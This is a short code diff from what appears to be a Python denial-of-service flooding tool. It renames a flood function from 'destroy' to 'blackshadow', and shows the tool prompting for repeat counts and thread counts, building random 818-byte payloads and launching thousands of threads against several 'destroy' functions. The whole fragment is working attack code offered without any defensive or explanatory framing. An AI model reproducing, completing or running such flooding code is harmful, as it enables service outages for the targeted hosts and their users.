@@ -14,7 +14,9 @@ times = int(input("TIMES (7500) : "))
 threads = int(input("THREADS (2800) : "))
 os.system('cls' if os.name == 'nt' else 'clear')
 
-def destroy():
+
+
+def blackshadow():
 	data = random._urandom(818)
 	while True:
 		try:
@@ -371,7 +373,7 @@ for _o in range(threads):
 	threading.Thread(target=xxx).start()
 
 for _i in range(threads):
-	threading.Thread(target=destroy).start()
+	threading.Thread(target=blackshadow).start()
 	threading.Thread(target=destroyx).start()
 	threading.Thread(target=destroyxx).start()
 	threading.Thread(target=destroyxxx).start()
